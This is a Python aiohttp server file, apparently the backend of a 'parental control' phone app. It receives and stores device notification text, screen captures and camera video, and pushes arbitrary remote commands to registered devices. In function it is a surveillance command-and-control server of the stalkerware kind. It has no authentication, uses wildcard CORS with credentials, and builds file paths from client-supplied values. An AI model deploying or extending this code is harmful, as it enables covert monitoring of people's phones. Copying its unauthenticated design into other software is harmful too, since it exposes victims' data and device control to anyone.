#!/usr/bin/env python3
"""
Cloud-optimized server for Parental Control App
Works with Render, Railway, Fly.io, etc.
Uses aiohttp for unified HTTP + WebSocket server
"""

import asyncio
import json
import base64
import os
from datetime import datetime
from aiohttp import web, WSMsgType
from aiohttp.web import Application
import aiohttp_cors

# Get port from environment (cloud platforms set this)
PORT = int(os.environ.get('PORT', 8080))
HOST = os.environ.get('HOST', '0.0.0.0')

UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# WebSocket connections - store client info
connected_clients = {}  # {websocket: {'device_id': str, 'connected_at': datetime}}
device_commands = {}  # {device_id: [commands]}

app = Application()

# Enable CORS
cors = aiohttp_cors.setup(app, defaults={
    "*": aiohttp_cors.ResourceOptions(
        allow_credentials=True,
        expose_headers="*",
        allow_headers="*",
        allow_methods="*"
    )
})

async def index(request):
    """Health check endpoint"""
    return web.json_response({
        'status': 'online',
        'clients': len(connected_clients),
        'devices': [info for info in connected_clients.values()],
        'timestamp': datetime.now().isoformat()
    })

async def list_devices(request):
    """List all connected devices"""
    devices = []
    for ws, info in connected_clients.items():
        devices.append({
            'device_id': info.get('device_id', 'unknown'),
            'connected_at': info.get('connected_at'),
        })
    return web.json_response({'devices': devices, 'count': len(devices)})

async def send_command(request):
    """Send remote command to connected device"""
    try:
        data = await request.json()
        device_id = data.get('device_id', 'default')
        command = data.get('command')
        params = data.get('params', {})
        
        # Find device's websocket
        target_ws = None
        for ws, info in connected_clients.items():
            if info.get('device_id') == device_id:
                target_ws = ws
                break
        
        if target_ws is None:
            # Store command for when device connects
            if device_id not in device_commands:
                device_commands[device_id] = []
            device_commands[device_id].append({
                'command': command,
                'params': params,
                'timestamp': datetime.now().isoformat()
            })
            return web.json_response({
                'status': 'queued',
                'message': 'Device not connected, command queued'
            })
        
        # Send command immediately via WebSocket
        command_msg = {
            'type': 'remote_command',
            'command': command,
            'params': params,
            'timestamp': datetime.now().isoformat()
        }
        
        await target_ws.send_str(json.dumps(command_msg))
        print(f"[COMMAND] Sent to {device_id}: {command}")
        return web.json_response({'status': 'sent', 'command': command})
        
    except Exception as e:
        print(f"[ERROR] Command error: {e}")
        return web.json_response({'error': str(e)}, status=500)

async def receive_notification(request):
    """Receive notification data via HTTP"""
    try:
        data = await request.json()
        print(f"[NOTIFICATION] {datetime.now()}")
        print(f"  Package: {data.get('package')}")
        print(f"  Title: {data.get('title')}")
        print(f"  Text: {data.get('text')}")
        return web.json_response({'status': 'received'})
    except Exception as e:
        print(f"[ERROR] {e}")
        return web.json_response({'error': str(e)}, status=400)

async def upload_video(request):
    """Receive video file upload"""
    try:
        reader = await request.multipart()
        video_file = None
        camera_type = 'unknown'
        timestamp = ''
        
        while True:
            field = await reader.next()
            if field is None:
                break
            if field.name == 'video':
                video_file = field
            elif field.name == 'camera_type':
                camera_type = await field.read()
                camera_type = camera_type.decode('utf-8')
            elif field.name == 'timestamp':
                timestamp = await field.read()
                timestamp = timestamp.decode('utf-8')
        
        if video_file is None:
            return web.json_response({'error': 'No video file'}, status=400)
        
        filename = f"video_{camera_type}_{timestamp}.mp4"
        filepath = os.path.join(UPLOAD_FOLDER, filename)
        
        with open(filepath, 'wb') as f:
            while True:
                chunk = await video_file.read_chunk()
                if not chunk:
                    break
                f.write(chunk)
        
        print(f"[VIDEO UPLOAD] {datetime.now()}")
        print(f"  Camera: {camera_type}")
        print(f"  File: {filename}")
        print(f"  Size: {os.path.getsize(filepath)} bytes")
        
        return web.json_response({'status': 'uploaded', 'filename': filename})
    except Exception as e:
        print(f"[ERROR] {e}")
        return web.json_response({'error': str(e)}, status=500)

async def websocket_handler(request):
    """Handle WebSocket connections"""
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    
    client_addr = request.remote
    device_id = 'unknown'
    
    try:
        # Wait for device registration
        msg = await asyncio.wait_for(ws.receive(), timeout=10.0)
        if msg.type != WSMsgType.TEXT:
            await ws.close()
            return ws
        
        reg_data = json.loads(msg.data)
        device_id = reg_data.get('device_id', f"device_{len(connected_clients)}")
        
        connected_clients[ws] = {
            'device_id': device_id,
            'connected_at': datetime.now().isoformat(),
            'address': client_addr
        }
        
        print(f"[WEBSOCKET] Device connected: {device_id} from {client_addr}")
        
        # Send any queued commands
        if device_id in device_commands:
            queued_count = len(device_commands[device_id])
            for cmd in device_commands[device_id]:
                command_msg = {
                    'type': 'remote_command',
                    'command': cmd['command'],
                    'params': cmd['params'],
                    'timestamp': cmd['timestamp']
                }
                await ws.send_str(json.dumps(command_msg))
            del device_commands[device_id]
            print(f"[COMMAND] Sent {queued_count} queued commands to {device_id}")
        
        # Handle incoming messages
        async for msg in ws:
            if msg.type == WSMsgType.TEXT:
                try:
                    data = json.loads(msg.data)
                    msg_type = data.get('type')
                    
                    if msg_type == 'screen_capture':
                        # Save screen capture
                        image_data = base64.b64decode(data.get('data'))
                        filename = f"screen_{device_id}_{data.get('timestamp')}.jpg"
                        filepath = os.path.join(UPLOAD_FOLDER, filename)
                        with open(filepath, 'wb') as f:
                            f.write(image_data)
                        print(f"[SCREEN] Saved: {filename} ({len(image_data)} bytes)")
                    
                    elif msg_type == 'notification':
                        print(f"[NOTIFICATION] {datetime.now()} from {device_id}")
                        print(f"  Package: {data.get('package')}")
                        print(f"  Title: {data.get('title')}")
                        print(f"  Text: {data.get('text')}")
                    
                    elif msg_type == 'flashlight':
                        status = "ON" if data.get('status') else "OFF"
                        print(f"[FLASHLIGHT] {device_id}: {status} at {datetime.now()}")
                    
                    elif msg_type == 'command_response':
                        print(f"[COMMAND_RESPONSE] {device_id}: {data.get('command')} - {data.get('status')}")
                    
                except json.JSONDecodeError:
                    print(f"[ERROR] Invalid JSON: {msg.data[:100]}")
                except Exception as e:
                    print(f"[ERROR] {e}")
            elif msg.type == WSMsgType.ERROR:
                print(f"[WEBSOCKET] Error: {ws.exception()}")
                break
    
    except asyncio.TimeoutError:
        print(f"[WEBSOCKET] Connection timeout: {client_addr}")
    except Exception as e:
        print(f"[ERROR] WebSocket error: {e}")
    finally:
        if ws in connected_clients:
            del connected_clients[ws]
        print(f"[WEBSOCKET] Device disconnected: {device_id} ({client_addr})")
    
    return ws

# Setup routes
app.router.add_get('/', index)
app.router.add_get('/api/devices', list_devices)
app.router.add_post('/api/command', send_command)
app.router.add_post('/api/notification', receive_notification)
app.router.add_post('/api/upload/video', upload_video)
app.router.add_get('/ws', websocket_handler)

# Apply CORS to all routes
for route in list(app.router.routes()):
    cors.add(route)

def main():
    """Start server"""
    print("=" * 50)
    print("Parental Control Server (Cloud Edition)")
    print("=" * 50)
    print(f"Port: {PORT}")
    print(f"Host: {HOST}")
    print(f"Upload folder: {os.path.abspath(UPLOAD_FOLDER)}")
    print()
    print(f"Server starting on http://{HOST}:{PORT}")
    print(f"WebSocket: ws://{HOST}:{PORT}/ws")
    print()
    
    web.run_app(app, host=HOST, port=PORT)

if __name__ == '__main__':
    main()
